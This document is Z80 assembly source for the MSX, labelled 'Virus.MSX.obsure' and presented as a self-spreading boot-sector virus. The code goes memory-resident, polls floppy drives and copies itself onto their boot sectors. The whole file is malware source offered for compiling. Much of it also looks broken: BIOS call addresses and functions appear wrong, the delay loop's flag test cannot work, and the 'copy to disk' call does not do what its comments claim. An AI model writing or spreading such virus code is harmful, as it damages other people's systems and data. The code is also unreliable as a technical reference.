; Virus.MSX.obsure
; compile with PASMO or any Z80 assembler that supports MSX

        ORG    $100H         ; Start of the COM file (bootloader)

START:
        DI                  ; Disable interrupts
        CALL    Init         ; Initialize the program
        CALL    StayResident ; Make the program resident
        CALL    MainLoop     ; Start the main loop

; ---- Initialization ----
Init:
        ; Set up the stack and necessary BIOS calls for memory-resident
        LD HL, $FFFF        ; Set stack pointer to end of RAM (usually)
        LD SP, HL
        RET

; ---- Stay Resident ----
StayResident:
        ; Make the program memory resident
        LD HL, $8000        ; Resident address for our program
        LD DE, $8000        ; Copy to this address
        LD BC, 0x0800       ; Size of program (2KB for example, adjust as needed)
        CALL  $5C00          ; MSX-DOS: Allocate memory (size in BC)
        RET

; ---- Main Loop ----
MainLoop:
        CALL    CheckFloppy  ; Check if a floppy disk is inserted
        CALL    Delay        ; Wait for 2 seconds
        JP      MainLoop     ; Repeat loop

; ---- Check Floppy ----
CheckFloppy:
        ; Check drive A: for a floppy disk
        CALL    CheckDriveA  ; Check if floppy disk is inserted in drive A:
        JP Z, NoFloppyA      ; If no floppy inserted in A:, skip to next check

        ; If a floppy disk is inserted in A:, check drive B: for a floppy
        CALL    CheckDriveB  ; Check if floppy disk is inserted in drive B:
        JP Z, NoFloppyB     ; If no floppy inserted in B:, return

        ; If a floppy is inserted in both A: and B:, copy to B:
        CALL    CopyToBootB  ; Copy the program to the boot sector of drive B
        RET

NoFloppyA:
        ; Check if floppy disk is inserted in drive B:
        CALL    CheckDriveB  ; Check if floppy disk is inserted in drive B:
        JP Z, NoFloppyB     ; If no floppy inserted in B:, return

        ; If a floppy disk is inserted in B:, copy to A:
        CALL    CopyToBootA  ; Copy the program to the boot sector of drive A
        RET

NoFloppyB:
        RET

; ---- Check if Floppy is inserted in Drive A: ----
CheckDriveA:
        LD A, $1A           ; MSX BIOS call to check for floppy
        CALL $0010          ; BIOS: Check floppy status for A:
        RET

; ---- Check if Floppy is inserted in Drive B: ----
CheckDriveB:
        LD A, $1B           ; MSX BIOS call to check for floppy in B:
        CALL $0010          ; BIOS: Check floppy status for B:
        RET

; ---- Copy Program to Boot Sector of Drive A: ----
CopyToBootA:
        ; Copy the program to the boot sector (start of disk A)
        LD HL, $8000        ; Address of our resident program
        LD DE, $0200        ; Boot sector (start of the disk)
        LD BC, 0x0100       ; Size to copy (256 bytes for simplicity)
        CALL $0026          ; BIOS call to copy memory to disk (Drive A)
        RET

; ---- Copy Program to Boot Sector of Drive B: ----
CopyToBootB:
        ; Copy the program to the boot sector (start of disk B)
        LD HL, $8000        ; Address of our resident program
        LD DE, $0200        ; Boot sector (start of the disk)
        LD BC, 0x0100       ; Size to copy (256 bytes for simplicity)
        CALL $0026          ; BIOS call to copy memory to disk (Drive B)
        RET

; ---- Delay for 2 seconds ----
Delay:
        LD BC, 0x1000       ; Loop count
DelayLoop:
        NOP                 ; No operation (wasting time)
        DEC BC
        JP NZ, DelayLoop    ; Repeat until delay is over
        RET

; ---- End of Program ----
        END START
